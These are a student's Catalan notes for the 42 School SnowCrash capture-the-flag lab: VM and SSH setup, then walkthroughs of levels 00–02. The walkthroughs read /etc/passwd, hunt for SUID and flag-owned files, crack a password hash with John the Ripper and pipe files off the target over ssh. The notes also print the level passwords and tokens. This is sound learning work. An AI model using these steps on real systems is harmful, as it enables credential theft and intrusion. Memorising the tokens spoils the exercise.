# NOTES:
## SNOWCRASH (42 School Outer Core Project)
### Instal·lació de Virtual Machine Manager
```bash
sudo apt install qemu-kvm libvirt-daemon-system libvirt-clients virt-manager
```
### Guardar la imatge ISO de snowCrash a la ruta per restricció i protecció:
```bash
me@pc:/var/lib/libvirt/images
```
### Donar premisos al usuari al grup libvirt per gestionar màquines virtuals sense fer servir sudo
```bash
sudo usermod -aG libvirt $USER
```
### Donar permisos al usuari al grup kvm per poder executar virtualització de maquinari (CPU, acceleració de KVM...)
```bash
sudo usermod -aG kvm $USER
```
### Iniciar software virtaul machine manager
```bash
virt-manager        # Al obrir amb CLI problemes al tancar i obrir amb GUI, obrir i tancar la MV, a través de GUI
```
### Crear màquina virtual
```text
- Crear màquina virtual
- Escollir la iso del path anteriorment guardada /var/lib/libvirt/images
- Treure selcció premuda en la casella de detecció auomàtica de SO
- Posar Generic Linux 2024 en el camp buit
- RAM: 2048MB - CPU: 2 - DISK: 20GB - OS: Generic Linux  
```
### A tenir en compte amb snowCrash CTF (capture the flag)
#### Connectar-se directament des de la màquina virtual
```bash
SnowCrash login: level00
Password: level00
level00@SnowCrash:~$_
```
#### Connectar-se via SSH, després d' obtenir la IP, al ser NAT s'ha d'agafar a la virbr0(IP del bridge NAT de la VM)
```bash
ip a                                    # primera opció per obtenir la IP
hostname -I                             # segona opció per obtenir IP 
ssh level00@192.168.XXX.XXX -p 4242     # login:nivellUsuari@ipVM -p portNum
password: level00
```
#### Si no pots tenir connexió SSH, potser et falta openssh o arrencar ssh
##### Comprovar: 
```bash
ssh -V
```
```bash
sshd -V
```
##### Instal·lar i comprovar:
```bash
sudo apt install openssh-server -y
sudo systemctl enable ssh    # per arrancar automàticament
sudo systemctl start ssh     # iniciar immediatament
sudo systemctl status ssh    # comprovar que està actiu
```
##### Encara que el més segur és que SSH ha d'escoltar el port 4242 a més del 22
```bash
sudo vim /etc/ssh/sshd_config
```
###### Afegeix el port 4242
```bash
Port 22
Port 4242
```
###### Reiniciar servei SSH perque els canvis tinguin efecte
```bash
sudo systemctl restart ssh
```
###### Comprovar quins ports estan oberts en SSH
```bash
sudo ss -tlnp | grep ssh
```
###### En el cas que el tallafocs estigui activat
```bash
sudo ufw allow 4242/tcp
sudo ufw reload
```
###### El problema que m'he trobat és que usant Kubuntu amb (systemd socket activation) activat. Per defecte el servei SSH està activat com a ssh.socke i no només com a ssh.service. Provocant que el systemd crea els sockets(ports) abans que el servei sshd arranqui, fent que el socket del port 4242 afegit no s'actualitzi
```bash
sudo systemctl daemon-reload        # recarrega la configuració inclós ssh_config
sudo systemctl restart ssh.socket   # obliga systemd a recrear els sockets segons els ports definits en el arxiu ssh_config de la ruta /etc/ssh/
sudo systemctl restart ssh.service
```
#### Bé, un cop ja tenim el port 4242 habilitat ja podem tornar a provar de connectar-nos per SSH
```bash
ssh level00@192.168.XXX.XXX -p 4242
```
##### Ens sortirà un missatge semblant al següent, el primer cop que ens volguem connectar i no tornarà a sortir el missatge. Si és que algú no ha modificta el servidor amb una altra clau ED25519
```bash
The authenticity of host '[192.168.XXX.XXX]:4242 ([192.168.XXX.XXX]:4242)' can't be established.
ED25519 key fingerprint is SHA256:dWmhuIFMaHqpgqvS0wQ2pFXFk1vTdoXuR8geTz24NnU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])?
```
##### Escrivim 'yes' per acceptar i confirmar que es confia en aquest servidor abans d'afegir la clau al fitxer ~/.ssh/known_hosts. Ja que SSH no ha vist abans aquesta màquina o port, doncs cada servidor SSH té unca clau única (host key) per identificar-se.
#### Tenir en compte els comandaments següents si no podem tancar la VM
```bash
virsh list --all        # Comprovar l'estat de les màquines virtuals
virsh shutdown VMname   # Tancar la màquina virtual
virsh destroy VMname     # Forçar a tancar la màquina virtual
```
#### Un cop som dins de la màquina virtual des de Virtual Machine Manager. comprovar IP amb (:~$ ip a). Si només es veu 'lo:', significa que no té interfície física de xarxa i no té IP encara
```text
Anar a la pestanya de Visualitza de la VM i prem la casella Detalls, en la columna esquerra selecciona la opció NIC: i canvia el Model de dispositiu de virtio a e1000e o a l'inversa. En el aquest cas la ISO de snowcrash és massa antiga i virtio és massa modern perque la VM detecti la targeta
Tornar a obrir la màquina virtual i aquest cop es veurà que ja es disposa de interfície física de xarxa i només 'lo:' 
```
#### Exemple de Connexió exitosa:
```bash
ssh level00@192.168.122.220 -p 4242             # Connectem via SSH
level00@192.168.122.220's password: level00     # Posem password
level00@SnowCrash:~$                            # Ja hi som dins
```
---
### Començar snowCrash CTF (capture the flag)
#### Sempre entrar a cada nivell segons el usuari/nivell que et toqui amb la contrasenya adquirida
```bash
ssh levelXX@IPvm -p 4242
password: levelXX
whoami                  # Quin usuari/nivell estàs
```
##### Cada nivell té un usuari especial
```bash
flagXX                  # Usuari especial de cada nivell
flag00                  # En el nivell 0
```
##### Aquests usuaris són els que podran executar 'getflag' correctament. però com que no tenim la constrasenya. l'objectiu serà descobrir la constrasenya de flag00. Un cop ja tinguem la password de flag00 farem:
```bash
su flag00               # Se'ns demanarà la clau que haguem trobat
flag00@SnowCrash:~$     # Sortirà el anterior output si funciona
getflag                 # Executar, per comprovar si ets l'usuari correcte
Check flag.Here is your token: XXXXXXXXXXXXXXXXXXXX
```
##### Entrar al següent nivell
```bash
su level01
password: XXXXXXXXXXXX  # La que t'ha donat getflag
level01@SnowCrash:~$    # Ja hi seràs al següent nivell
```
---
#### El patró de tot el projecte
##### Cada nivell segueix sempre aquest flux:
```text
login levelXX
↓
investigar el sistema
↓
trobar password flagXX
↓
su flagXX
↓
getflag
↓
obtenir password levelXX+1
↓
su levelXX+1
```
---
#### Tenir en compte per trobar els passwords
```text
- Permisos de fitxers mal configurats
- Scripts insegurs
- Variables d'entorn
- SUID binaries
- Command injection
- PATH hijacking
```
#### S'ha de saber de:
```text
- Lectura de PCAP(packet capture): Analitzar tràfic de xarxa, detectar intrusions i diagnosticar problemes, registrar paquets de dades sense procesar
- GDB (GNU debugger) permet analitzar variables, registres, fer breakpoints
- John the Ripper per auditar i recuperar contrasenyes
- Python, Ruby, Php, Perl, Lua i Shell Scripting
```
#### Consultar:
- cloudshark.org
- gchq.github.io/CyberChef/
- dcode.fr
---
#### Què s'ha de guardar al repositori
```text
Per cada nivell:
level00/
 ├─ flag
 └─ resources/
flag → pot contenir la flag o estar buit
resources → scripts, comandes, notes, proves
Important: Explicar com ho has fet.
---
#### Consells importants per SnowCrash
##### Quan es comenci un nivell, fer com els pentesters:
```bash
~$ ls -la
~$ id
~$ pwd
~$ cat /etc/passwd
~$ whoami
~$ find / -user flag00 2>/dev/null
~$ find / -perm -4000 2>/dev/null
~$ env
~$ ps aux
```
##### Explicació del comandament:
```text
find /
*find* és una eina de Linux per cercar fitxers i directoris.
*/* indica que la cerca comença a l’arrel del sistema de fitxers, o sigui tota la màquina.

-user flag00
Això filtra només els fitxers propietat de l’usuari flag00.
Només retornarà fitxers on ls -l mostraria flag00 a la columna del propietari.

2>/dev/null
*2>* redirigeix els errors (stderr) a un lloc.
*/dev/null* és un “forat negre”, així que els errors desapareixen.
Exemple d’errors que desapareixen: “Permission denied” quan find no pot entrar a algun directori.
```
##### Quan es vegin strings estranyes, provar...
```text
1- Base64
2- ROT13
3- Caesar Cipher
4- Hex
5- Subtitució Simple
```
---
### LEVEL00
#### He fet els següents comandaments:
```bash
level00@SnowCrash:~$             # Mostra tots els fitxers, ocults inclosos
total 12
dr-xr-x---+ 1 level00 level00  100 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-xr-x---+ 1 level00 level00  220 Apr  3  2012 .bash_logout
-r-xr-x---+ 1 level00 level00 3518 Aug 30  2015 .bashrc
-r-xr-x---+ 1 level00 level00  675 Apr  3  2012 .profile
```
```bash
level00@SnowCrash:~$ ls -lh     # Mostra mides llegibles per humans(kb,mb)
total 0
```
```bash
level00@SnowCrash:~$ find / -user flag00 2>/dev/null  # Buscar fitxers de propietat del usuari flag00
/usr/sbin/john
/rofs/usr/sbin/john
```
```bash
level00@SnowCrash:~$ cat /usr/sbin/john
cdiiddwpgswtgt
level00@SnowCrash:~$ cat /rofs/usr/sbin/john
cdiiddwpgswtgt
```
##### Agafem el text dins dels arxius 'john' i fem un Caesar Cypher amb Python Scripting
```bash
python3
```
```python3
text = "cdiiddwpgswtgt"
alphabet = "abcdefghijklmnopqrstuvwxyz"

for shift in range(26):
    result = ""
    for c in text:
        if c in alphabet:
            result += alphabet[(alphabet.index(c)-shift) % 26]
        else:
            result += c
    print(shift, result)
```
###### Explicació del Script
```text
1- Definim el text a desxifrar
text = "cdiiddwpgswtgt"
Aquí guardem la string que volem analitzar i hem trobat al fitxer john.

2- Definim l’alfabet
alphabet = "abcdefghijklmnopqrstuvwxyz"
Això és simplement una referència de lletres per poder calcular desplaçaments.
Exemple:
a → posició 0
b → posició 1
c → posició 2
...
z → posició 25

3- Provem tots els possibles shifts
for shift in range(26):
Això fa un bucle de: 0 → 25
Per què 26? Perquè l’alfabet té 26 lletres, així que el Caesar cipher només pot tenir 26 variants.

4- Inicialitzem la string resultat
result = ""
Aquí anirem construint el text desxifrat lletra a lletra.

5- Iterem per cada lletra del text
for c in text:
Si el text és: c d i i d d w p g s w t g t
el bucle recorrerà cada caràcter individualment.

6- Comprovem si és una lletra
if c in alphabet:
Això serveix per evitar problemes amb: espais, punts, números
En aquest cas tot són lletres.

7- Calculem la nova lletra
alphabet[(alphabet.index(c)-shift) % 26]
a) trobar la posició de la lletra: alphabet.index(c)
Exemple: c → 2
b) aplicar el shift: Si shift = 1
2 - 1 = 1
c) evitar sortir de l’alfabet
% 26
Això és el mòdul.
Exemple: a - 1 = -1
-1 % 26 = 25
que és: z
Això permet fer wrap-around a l’alfabet.

8- Afegim la lletra al resultat
result += ...
Això construeix la nova string.
Exemple:
cdii
↓
bcdd

9- Si no és lletra
else:
    result += c
Simplement copia el caràcter tal qual.

10- Mostrem el resultat
print(shift, result)
```
###### OUTPUT:
```text
0 cdiiddwpgswtgt
1 bchhccvofrvsfs
2 abggbbunequrer
3 zaffaatmdptqdq
4 yzeezzslcospcp
5 xyddyyrkbnrobo
6 wxccxxqjamqnan
7 vwbbwwpizlpmzm
8 uvaavvohykolyl
9 tuzzuungxjnkxk
10 styyttmfwimjwj
11 rsxxsslevhlivi
12 qrwwrrkdugkhuh
13 pqvvqqjctfjgtg
14 opuuppibseifsf
15 nottoohardhere
16 mnssnngzqcgdqd
17 lmrrmmfypbfcpc
18 klqqllexoaebob
19 jkppkkdwnzdana
20 ijoojjcvmyczmz
21 hinniibulxbyly
22 ghmmhhatkwaxkx
23 fgllggzsjvzwjw
24 efkkffyriuyviv
25 dejjeexqhtxuhu
```
###### VERSIÓ 1 SCRIPT MÉS CURT AMB MATEIX RESULTAT
```python3
text="cdiiddwpgswtgt"
import string

for s in range(26):
    print(s,"".join(string.ascii_lowercase[(string.ascii_lowercase.index(c)-s)%26] for c in text))
```
```text
1- Importar l’alfabet automàticament
import string
Això permet usar: string.ascii_lowercase
que és: abcdefghijklmnopqrstuvwxyz
No cal escriure-ho manualment.

2- Construcció de la paraula amb join
"".join(...)
join() uneix totes les lletres generades dins del parèntesi en una sola string.
Exemple:
["n","o","t"]
↓
not

3- Generador dins del join
Aquesta part:
(string.ascii_lowercase[(string.ascii_lowercase.index(c)-s)%26] for c in text)
és un generator expression.
És bàsicament una versió compacta de: for c in text:
```
###### VERSIÓ 2 SCRIPT MÉS CURT AMB MATEIX RESULTAT
```python3
import codecs
for i in range(26):
    print(i,"".join(chr((ord(c)-97-i)%26+97) for c in "cdiiddwpgswtgt"))
```
```text
ord() → convertir lletra a número
chr() → convertir número a lletra
```
###### SOLUCIÓ del CAESAR SCRIPT: nottoohardhere
```bash
level00@SnowCrash:~$ su flag00
Password:  nottoohardhere
Don't forget to launch getflag !
flag00@SnowCrash:~$ getflag
Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
```
---
### LEVEL01
#### He fet els següents comandaments:
##### ENTRAR al LEVEL01 amb el TOKEN obtingut de GETFLAG des de dins de la VM
```bash
flag00@SnowCrash:~$ su level01
Password: x24ti5gi3x0ol2eh4esiuxias
level01@SnowCrash:~$ 
```
##### ENTRAR al LEVEL01 amb el TOKEN obtingut de GETFLAG des de SSH
```bash
flag00@SnowCrash:~$ ssh level01@192.168.122.220 -p 4242
Could not create directory '/home/flag/flag00/.ssh'.
The authenticity of host '[192.168.122.220]:4242 ([192.168.122.220]:4242)' can't be established.
ECDSA key fingerprint is 6a:83:c6:2e:df:7a:c8:e0:1c:bc:d8:84:32:e0:84:ad.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/flag/flag00/.ssh/known_hosts).
           _____                      _____               _     
          / ____|                    / ____|             | |    
         | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          
level01@192.168.122.220's password: x24ti5gi3x0ol2eh4esiuxias
level01@SnowCrash:~$
```
##### BUSCAR PASSWORDS
```bash
level01@SnowCrash:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
whoopsie:x:103:107::/nonexistent:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
level00:x:2000:2000::/home/user/level00:/bin/bash
level01:x:2001:2001::/home/user/level01:/bin/bash
level02:x:2002:2002::/home/user/level02:/bin/bash
level03:x:2003:2003::/home/user/level03:/bin/bash
level04:x:2004:2004::/home/user/level04:/bin/bash
level05:x:2005:2005::/home/user/level05:/bin/bash
level06:x:2006:2006::/home/user/level06:/bin/bash
level07:x:2007:2007::/home/user/level07:/bin/bash
level08:x:2008:2008::/home/user/level08:/bin/bash
level09:x:2009:2009::/home/user/level09:/bin/bash
level10:x:2010:2010::/home/user/level10:/bin/bash
level11:x:2011:2011::/home/user/level11:/bin/bash
level12:x:2012:2012::/home/user/level12:/bin/bash
level13:x:2013:2013::/home/user/level13:/bin/bash
level14:x:2014:2014::/home/user/level14:/bin/bash
flag00:x:3000:3000::/home/flag/flag00:/bin/bash
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
flag02:x:3002:3002::/home/flag/flag02:/bin/bash
flag03:x:3003:3003::/home/flag/flag03:/bin/bash
flag04:x:3004:3004::/home/flag/flag04:/bin/bash
flag05:x:3005:3005::/home/flag/flag05:/bin/bash
flag06:x:3006:3006::/home/flag/flag06:/bin/bash
flag07:x:3007:3007::/home/flag/flag07:/bin/bash
flag08:x:3008:3008::/home/flag/flag08:/bin/bash
flag09:x:3009:3009::/home/flag/flag09:/bin/bash
flag10:x:3010:3010::/home/flag/flag10:/bin/bash
flag11:x:3011:3011::/home/flag/flag11:/bin/bash
flag12:x:3012:3012::/home/flag/flag12:/bin/bash
flag13:x:3013:3013::/home/flag/flag13:/bin/bash
flag14:x:3014:3014::/home/flag/flag14:/bin/bash
level01@SnowCrash:~$
```
###### Línia a destecar:
```bash
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
```
###### Copiar el hash en un fitxer si es disposés de permisos:
```bash
level01@SnowCrash:~$ echo "42hDRfypTqqnw" > hash.txt
```
###### Com no es disposa de permisos, copiar en el directori del host:
```bash
level01@SnowCrash:~$ echo '42hDRfypTqqnw' | ssh hostUser@192.168.1.19 "cat > /home/hostUser/Documents/42outerCore/snow_crash/snow_crash/level01/resources/hash.txt"
Could not create directory '/home/user/level01/.ssh'.
The authenticity of host '192.168.1.19 (192.168.1.19)' can't be established.
ECDSA key fingerprint is e2:f0:85:bc:8c:d1:aa:83:cc:f7:be:05:84:4b:b0:ae.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/user/level01/.ssh/known_hosts).
hostUser@192.168.1.19's password: myHostPassword
level01@SnowCrash:~$
```
###### OBSERVACIÓ/RECORDATORI:
```text
pepe@pc:
pepe -> nom de l'usuari
pc -> nom de l'ordinador amfitrió o la seva IP 
hostUser@hostName:
hostUser@hostIP:
whoami -> hostUser
hostname -> hostName
hostIP -> hostname -I / ip a
```
##### HOST: Fer servr John The Ripper per obtenir contrasenya del hash
```bash
hostUser@hostName:~/Documents/42outerCore/snow_crash/snow_crash/level01/resources$ ls
hash.txt
hostUser@hostName:~/Documents/42outerCore/snow_crash/snow_crash/level01/resources$ john --show hash.txt 
?:abcdefg

1 password hash cracked, 0 left
hostUser@hostName:~/Documents/42outerCore/snow_crash/snow_crash/level01/resources$
```
##### Tornem a la VM:
```bash
level01@SnowCrash:~$ su flag01
Password: abcdefg
Don't forget to launch getflag !
flag01@SnowCrash:~$ getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
flag01@SnowCrash:~$ 
```
---
### LEVEL02
#### He fet els següents comandaments:
##### Connexió SSH al level02:
```bash
flag01@SnowCrash:~$ ssh level02@snowcrash -p 4242Could not create directory '/home/flag/flag01/.ssh'.
The authenticity of host '[snowcrash]:4242 ([127.0.1.1]:4242)' can't be established.
ECDSA key fingerprint is 6a:83:c6:2e:df:7a:c8:e0:1c:bc:d8:84:32:e0:84:ad.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/flag/flag01/.ssh/known_hosts).
           _____                      _____               _     
          / ____|                    / ____|             | |    
         | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
level02@SnowCrash:~$ 
```
##### Llistar fitxers i directoris visibles i ocults:
```bash
level02@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level02 level02  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level02 level02  220 Apr  3  2012 .bash_logout
-r-x------ 1 level02 level02 3518 Aug 30  2015 .bashrc
-r-x------ 1 level02 level02  675 Apr  3  2012 .profile
----r--r-- 1 flag02  level02 8302 Aug 30  2015 level02.pcap
level02@SnowCrash:~$ 
```
##### Observem fitxer sospitós amb format ".pcap":
```bash
----r--r-- 1 flag02  level02 8302 Aug 30  2015 level02.pcap
```
```text
.pcap -> Es tracta d'un format de captura de trànsit de xarxa (packet capture)
```
##### Observem per estar segurs de quin tipus d'arxiu es tracta:
```bash
level02@SnowCrash:~$ file level02.pcap
level02.pcap: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 16777216)
```
###### Lectura amb el comandament "strings" que serveix per extreure text ASCII dins del binari:
```bash
level02@SnowCrash:~$ strings level02.pcap 
@f&N.
@f&N
@f&N
@f&N
%@f&N
@f&N
%@f&NZ
$@f&N
$@f&N
$@f&N)
@f&N
38400,38400
SodaCan:0
DISPLAY
SodaCan:0
xterm
@f&N0
!@f&N
!@f&NF
@f&N
@f&N
"@f&N
"@f&N0
@f&Nm-
@f&N
Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)
wwwbugs login: @f&NV.
Lf&N
lLf&Nf
lLf&N
Lf&N`
eLf&N
eLf&N
Lf&Ny
vLf&N#
vLf&N
;&Lf&Nu
;&eLf&N
eLf&Ne
;<Lf&N
;<lLf&N
lLf&N
;NMf&N
;NXMf&N
XMf&N
Nf&N
Nf&N
Nf&N
<bNf&N
Password: Nf&Nat
<bVf&N
<bfVf&ND
Wf&N}
tWf&N
Wf&N
ET_Wf&N
YXf&N
wXf&NP?
Xf&N
FdaXf&N
Xf&N
nXf&N?B
Xf&N
dXf&N
Yf&N<T
rYf&N
Zf&Ne/
Zf&N
[f&N
[f&N 
[f&N
[f&N
\f&N
N\f&N\
\f&N
JTD\f&N,
/^f&N
R^f&NQ
_f&N
L,e_f&N<
[`f&N\9
Mtl`f&N
`f&N
`f&N
`f&N
N}L`f&N
af&N
0af&N
af&N
Laf&N
af&Nq
af&N
Jaf&N
af&N~
df&N
df&N
R}df&N8%
Login incorrect
wwwbugs login: df&N
R}jf&N
R}jf&N
jf&N
```
##### Passem l'arxiu al host per poder analitzar-l'ho de manera més acurada amb les eïnes que ens poguem descarregar:
```bash
level02@SnowCrash:~$ cat level02.pcap | ssh hostUser@192.168.1.19 "cat > /home/hostUser/Documents/42outerCore/snow_crash/snow_crash/level02/resources/packetCapture.pcap"
Could not create directory '/home/user/level02/.ssh'.
The authenticity of host '192.168.1.19 (192.168.1.19)' can't be established.
ECDSA key fingerprint is e2:f0:85:bc:8c:d1:aa:83:cc:f7:be:05:84:4b:b0:ae.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/user/level02/.ssh/known_hosts).
hostUser@192.168.1.19's password: myHostPassword
```
##### Resultat no gaire clar amb comandament "strings", provarem amb el programa tcpdump:
```bash
tcpdump -r level02.pcap -A # -r(read) / -A(sortida amb text)
```
###### Lectura amb cru:
```bash
cat packetCapture.pcap 
�ò�@f&N.J'̊$E<��@@J>;���;��ߙO/Y�▒�����
f&N�JJ$E<@@�/;���;���/Y�O���A�▒ 8����
�.�f&N�B'̊$E4��@@JE;���;��ߙO/Y�▒º��B�sp
f&N֡EE$E7ԣ@@�;���;���/Y�O���B�▒▒��
                                 
�.�f&N͢B'̊$E4��@@JD;���;��ߙO/Y�▒º��E�s`
f&N��E'̊$E7��@@J@;���;��ߙO/Y�▒º��E�▒s�W
f&NZ�BB$E4Ԥ@@�;���;���/Y�O���E�▒ŀ�
                                  
�.�f&N�TT$EFԥ@@�;���;���/Y�O���E�▒ŀ▒ŧ�
�.�▒�� ��#��'��$@f&N��T'̊$EF��@@J0;���;��ߙO/Y�▒ź��W�▒s��
▒�� ��#��'��$@f&N)�ZZ$ELԦ@@y;���;���/Y�O���W�▒׀▒ō
�.�▒��@f&Nݥ�'̊$Ew��@@I�;���;��ߙO/Y�▒׺��o�▒s��
8400,38400����#SodaCan:0����'DISPLAYSodaCan:0����▒xterm��@f&N0�TT$EFԧ@@~;���;���/Y�O���o�▒▒�▒��9
�.�f&N��'̊$E~��@@I�;���;��ߙO/Y�▒▒�����▒sES
b       B▒

�����������1������!@f&NF�II$E;Ԩ@@�;���;���/Y�O�����▒d�▒��#
�.�f&NаI'̊$E;��@@J8;���;��ߙO/Y�▒d�����▒s�n
f&N��QQ$ECԩ@@;���;���/Y�O�����▒k�▒��
�.�f&N��K'̊$E=��@@J5;���;��ߙO/Y�▒k�����▒s�W
f&N0�kk$E]Ԫ@@d;���;���/Y�O�����▒t�▒�[a
�.�     ▒
�
 �����������@f&Nm-B'̊$E4��@@J=;���;��ߙO/Y�▒t�����s.
f&N�-��$Eԫ@@A;���;���/Y�O�����▒t�▒�K�
�.�
inux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)

wwwbugs login: @f&NV.B'̊$E4��@@J<;���;��ߙO/Y�▒t���
�s�
f&N�C'̊$E5��@@J:;���;��ߙO/Y�▒t���
                                �▒s�
Lf&Nf�DD$E6Ԭ@@�;���;���/Y�O���
                              �▒u�▒��r
�s�8f&N�B'̊$E4��@@J:;���;��ߙO/Y�▒u���
�▒s�%`  C'̊$E5��@@J8;���;��ߙO/Y�▒u���
�eLf&N
�▒v�▒��SDD$E6ԭ@@�;���;���/Y�O���
```
###### Lectura amb tcpdump:
```bash
cetf@7F:~/Documents/42outerCore/snow_crash/snow_crash/level02/resources$ tcpdump -r packetCapture.pcap -A
reading from file packetCapture.pcap, link-type EN10MB (Ethernet), snapshot length 16777216
07:23:12.267566 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [S], seq 2635601089, win 14600, options [mss 1460,sackOK,TS val 18592800 ecr 0,nop,wscale 7], length 0
E..<..@.@.J>;...;....O/Y..........9............
... ........
07:23:12.267694 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [S.], seq 3131636289, ack 2635601090, win 14480, options [mss 1460,sackOK,TS val 46280417 ecr 18592800,nop,wscale 5], length 0
E..<..@.@../;...;.../Y.O...A......8............
....... ....
07:23:12.267956 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [.], ack 1, win 115, options [nop,nop,TS val 18592800 ecr 46280417], length 0
E..4..@.@.JE;...;....O/Y.......B...s.p.....
... ....
07:23:12.303574 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [P.], seq 1:4, ack 1, win 453, options [nop,nop,TS val 46280426 ecr 18592800], length 3
E..7..@.@...;...;.../Y.O...B...............
....... ..%
07:23:12.303821 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [.], ack 4, win 115, options [nop,nop,TS val 18592804 ecr 46280426], length 0
E..4..@.@.JD;...;....O/Y.......E...s.`.....
...$....
07:23:12.303842 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 1:4, ack 4, win 115, options [nop,nop,TS val 18592804 ecr 46280426], length 3
E..7..@.@.J@;...;....O/Y.......E...s.W.....
...$......%
07:23:12.303962 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [.], ack 4, win 453, options [nop,nop,TS val 46280426 ecr 18592804], length 0
E..4..@.@...;...;.../Y.O...E...............
.......$
07:23:12.304147 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [P.], seq 4:22, ack 4, win 453, options [nop,nop,TS val 46280426 ecr 18592804], length 18
E..F..@.@...;...;.../Y.O...E...............
.......$..&..... ..#..'..$
07:23:12.304264 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 4:22, ack 22, win 115, options [nop,nop,TS val 18592804 ecr 46280426], length 18
E..F..@.@.J0;...;....O/Y.......W...s.......
...$......&..... ..#..'..$
07:23:12.304425 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [P.], seq 22:46, ack 22, win 453, options [nop,nop,TS val 46280426 ecr 18592804], length 24
E..L..@.@..y;...;.../Y.O...W...............
.......$.. .....#.....'.........
07:23:12.304605 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 22:89, ack 46, win 115, options [nop,nop,TS val 18592804 ecr 46280426], length 67
E..w..@.@.I.;...;....O/Y.......o...s.......
...$...... .38400,38400....#.SodaCan:0....'..DISPLAY.SodaCan:0......xterm..
07:23:12.306736 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [P.], seq 46:64, ack 89, win 453, options [nop,nop,TS val 46280427 ecr 18592804], length 18
E..F..@.@..~;...;.../Y.O...o.........9.....
.......$........"........!
07:23:12.306958 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 89:163, ack 64, win 115, options [nop,nop,TS val 18592804 ecr 46280427], length 74
E..~..@.@.I.;...;....O/Y...........sES.....
...$............"..".....b........b.... B.
..............................1.......!
07:23:12.307270 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [P.], seq 64:71, ack 163, win 453, options [nop,nop,TS val 46280427 ecr 18592804], length 7
E..;..@.@...;...;.../Y.O.......d.....#.....
.......$.."....
07:23:12.307408 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 163:170, ack 71, win 115, options [nop,nop,TS val 18592804 ecr 46280427], length 7
E..;..@.@.J8;...;....O/Y...d.......s.n.....
...$......"....
07:23:12.307704 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [P.], seq 71:86, ack 170, win 453, options [nop,nop,TS val 46280427 ecr 18592804], length 15
E..C..@.@...;...;.../Y.O.......k...........
.......$..!..........."
07:23:12.307843 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [P.], seq 170:179, ack 86, win 115, options [nop,nop,TS val 18592804 ecr 46280427], length 9
E..=..@.@.J5;...;....O/Y...k.......s.W.....
...$............"
07:23:12.308016 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [P.], seq 86:127, ack 179, win 453, options [nop,nop,TS val 46280427 ecr 18592804], length 41
E..]..@.@..d;...;.../Y.O.......t....[a.....
.......$..".............        ..
.....................
07:23:12.339309 IP 59.233.235.218.39247 > 59.233.235.223.12121: Flags [.], ack 127, win 115, options [nop,nop,TS val 18592808 ecr 46280427], length 0
E..4..@.@.J=;...;....O/Y...t.......s.......
...(....
07:23:12.339391 IP 59.233.235.223.12121 > 59.233.235.218.39247: Flags [P.], seq 127:202, ack 179, win 453, options [nop,nop,TS val 46280435 ecr 18592808], length 75
E.....@.@..A;...;.../Y.O.......t....K......
.......(
Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)

..wwwbugs login: 
